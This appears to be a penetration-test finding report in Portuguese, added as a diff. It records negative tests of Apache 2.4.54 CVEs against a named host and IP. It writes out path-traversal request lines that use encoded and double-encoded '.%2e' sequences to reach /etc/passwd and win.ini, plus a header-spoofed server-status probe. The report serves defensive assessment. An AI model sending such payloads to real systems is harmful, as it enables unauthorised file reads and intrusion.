@@ -1,0 +1,57 @@
+# F-022 — Apache 2.4.54 CVEs (path traversal / smuggling) — NEGATIVE
+
+**Alvo:** `http://wpp.fernandapessoa.com.br` (177.44.191.252, Windows, Apache 2.4.54 Win64 + OpenSSL/1.1.1p + PHP/7.4.33)
+**Data:** 2026-08-27 20:29 UTC
+**Severidade final:** Info (não confirmada)
+**Classificação:** Path Traversal / SSRF / Smuggling — não vulnerável
+
+## Contexto
+Host serve aplicação Scriptcase (redirect `/` → `sc_Login/` 302). `sc_Login/` retorna 404 (app via rewrite/alias).
+Apache 2.4.54 é a versão estável de Jul/2022 — patched contra CVE-2021-41773/42013 (que afetam 2.4.49/2.4.50).
+
+## CVEs testados (todos NEGATIVOS)
+
+### CVE-2021-41773 (path traversal)
+```
+GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/windows/win.ini   → 404/vazio (sem corpo)
+GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd        → 404/vazio
+```
+
+### CVE-2021-42013 (double encoding bypass)
+```
+GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/windows/win.ini → 404/vazio
+```
+
+### CVE-2024-38475 (mod_rewrite SSRF/path traversal — Apache <2.4.60)
+```
+GET /.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd → 404/vazio
+```
+Nota: aplica-se a 2.4.54 (<2.4.60), porém o backend não expõe rewrite/vhost vulnerável.
+
+### server-status / server-info
+```
+GET /server-status (com X-Forwarded-For: 127.0.0.1) → 403 Forbidden
+```
+
+### CVE-2023-25690 (HTTP request smuggling via mod_proxy/TE)
+Sem mod_proxy aparente — não aplicável.
+
+## Baseline (confirma host vivo)
+```
+GET / → 302 Found
+Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.33
+X-Powered-By: PHP/7.4.33
+Location: sc_Login/
+```
+
+## Conclusão
+Apache 2.4.54 está **patched** contra os CVEs de traversal de 2021 (corrigidos em 2.4.51).
+server-status protegido (403). Os paths de traversal não retornam conteúdo sensível.
+CVE-2024-38475 teoricamente aplicável à versão, mas a configuração do host (Scriptcase via rewrite) não expõe vetor explorável non-destrutivamente.
+
+## Recomendação
+- Manter Apache atualizado (upgrade para 2.4.62+ recomendado).
+- Validar regras mod_rewrite para evitar SSRF/loop em produção.
+- Mover `server-status`/`server-info` para localhost-only ou desabilitar.
+
+## Status: ❌ NÃO CONFIRMADO (vetor descartado)
